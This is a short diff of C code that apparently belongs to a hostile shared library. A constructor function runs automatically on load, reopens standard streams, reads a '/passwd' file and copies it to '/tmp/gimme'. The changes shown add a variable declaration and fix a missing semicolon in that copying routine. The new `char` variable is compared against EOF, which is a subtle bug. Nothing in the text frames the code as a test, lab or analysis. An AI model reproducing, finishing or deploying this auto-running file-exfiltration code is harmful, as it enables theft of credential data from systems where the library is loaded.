@@ -8,6 +8,7 @@
 static void __attribute__ ((constructor)) status(void) {
 FILE * passFile;
 FILE * toFile;
+char ch;
 
 char const err[] = "Error opening file!";
     if (dup2(STDIN_FILENO, STDOUT_FILENO) != STDOUT_FILENO) die();
@@ -33,7 +34,7 @@ char const err[] = "Error opening file!";
     fflush(stdout);
 
 passFile = fopen("/passwd", "r");
-toFile = fopen("/tmp/gimme", "w+")
+toFile = fopen("/tmp/gimme", "w+");
 
 ch = fgetc(passFile);
     while (ch != EOF)
